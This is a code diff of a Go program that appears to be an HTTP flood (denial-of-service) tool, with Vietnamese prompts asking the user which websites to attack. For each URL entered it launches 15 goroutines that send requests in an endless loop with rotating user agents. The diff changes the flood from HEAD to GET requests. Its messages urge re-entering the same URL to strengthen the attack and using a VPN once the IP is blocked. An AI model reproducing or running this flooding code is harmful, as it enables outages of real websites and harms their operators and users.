@@ -216,11 +216,11 @@ var (
 )
 
 func main() {
-	fmt.Println("  Chương trình tấn công xịn xò được phát triển bởi Đậu Đậu 5.0\n\n  Đậu Đậu sẽ tấn công những trang web nào? Nhập một liên kết và nhấn Enter\n")
+	fmt.Println("\n\n  Chương trình tấn công xịn xò được phát triển bởi Đậu Đậu 5.0\n\n  Bạn muốn tấn công những trang web nào? Nhập 1 URL và nhấn Enter\n")
 	scanner := bufio.NewScanner(os.Stdin)
 	for scanner.Scan() {
 		url := scanner.Text()
-		fmt.Println("  Đậu Đậu bắt đầu tấn công địa chỉ "+url+"\n  Trong khi trang web này đang bị tấn công, hãy nhập 1 liên kết tiếp theo hoặc nhập cùng một liên kết để làm cho cuộc tấn công mạnh hơn\n  Nhưng không cần thực hiện nhiều chuỗi trên 1 trang web vì nó sẽ chặn IP của bạn\n")
+		fmt.Println("\n  Bắt đầu tấn công địa chỉ "+url+"\n\n  Trong khi trang web này đang bị tấn công, hãy nhập 1 liên kết tiếp theo hoặc nhập cùng một liên kết để làm cho cuộc tấn công mạnh hơn\n  Nhưng không cần thực hiện nhiều chuỗi trên 1 trang web vì nó sẽ chặn IP của bạn\n")
 		for i := 0; i < 15; i++ {
 			go startFlood(url)
 		}
@@ -233,7 +233,7 @@ func startFlood(url string) {
 	num := rand.Intn(max - min) + min
 	userAgent := userAgents[num]
 	for {
-		req, err := http.NewRequest("HEAD", url, nil)
+		req, err := http.NewRequest("GET", url, nil)
 		if err != nil {
 			fmt.Println("  Thông báo, trang web đã bị lỗi hoặc IP của bạn bị chặn, hãy thử bật vpn và lặp lại.")
 			return
